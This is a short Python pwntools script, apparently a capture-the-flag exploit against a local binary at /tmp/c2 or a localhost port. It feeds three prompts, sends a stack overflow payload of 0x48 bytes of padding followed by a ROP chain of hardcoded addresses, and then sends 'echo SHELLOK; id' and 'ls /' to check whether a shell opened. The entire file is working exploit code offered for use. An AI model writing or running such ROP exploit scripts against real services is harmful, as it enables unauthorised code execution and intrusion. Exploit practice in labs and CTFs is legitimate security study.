#!/usr/bin/env python3
# local test against patched copy /tmp/c2 (checks NOPed) using a pty, exactly like the real service
import sys, time
from pwn import process, remote, p64, context
context.log_level = 'error'

mode = sys.argv[1]
if mode == 'local':
    io = process(['/tmp/c2'])
else:
    io = remote('127.0.0.1', int(sys.argv[2]))

io.recvuntil(b'A: '); io.sendline(b'0')
io.recvuntil(b'B: '); io.sendline(b'0')
io.recvuntil(b'C: '); io.sendline(b'0')
io.recvuntil(b'D> ')
pl = b'A'*0x48 + p64(0x4019ae) + p64(0x4019ad) + p64(0x482022) + p64(0x4060c0) + p64(0x40af71)
io.send(pl + b'\n')
time.sleep(0.4)
print('[after]', repr(io.recvrepeat(1.5)))
for c in [b'echo SHELLOK; id', b'ls /']:
    print('>>>', c)
    try:
        io.send(c + b'\n')
    except Exception as e:
        print('  send fail', repr(e)); break
    print('  ', repr(io.recvrepeat(1.5)))
try:
    io.close()
except Exception:
    pass
